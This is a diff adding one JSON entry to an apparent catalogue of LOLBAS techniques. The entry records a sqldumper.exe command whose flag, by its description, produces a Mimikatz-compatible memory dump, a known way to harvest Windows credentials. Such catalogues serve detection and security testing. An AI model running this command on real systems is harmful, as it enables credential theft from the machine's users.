@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-sqldumper-exe-dump-2",
+  "name": "LOLBAS · Sqldumper.exe (Dump) #2",
+  "command": "sqldumper.exe 540 0 0x01100:40",
+  "description": "0x01100:40 flag will create a Mimikatz compatible dump file.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "sqldumper",
+    "dump"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Sqldumper/",
+  "upstream_id": "Sqldumper.exe/Dump/1",
+  "category": "lolbas",
+  "subcategory": "dump",
+  "references": [
+    {
+      "title": "LOLBAS — Sqldumper.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Sqldumper/"
+    }
+  ]
+}
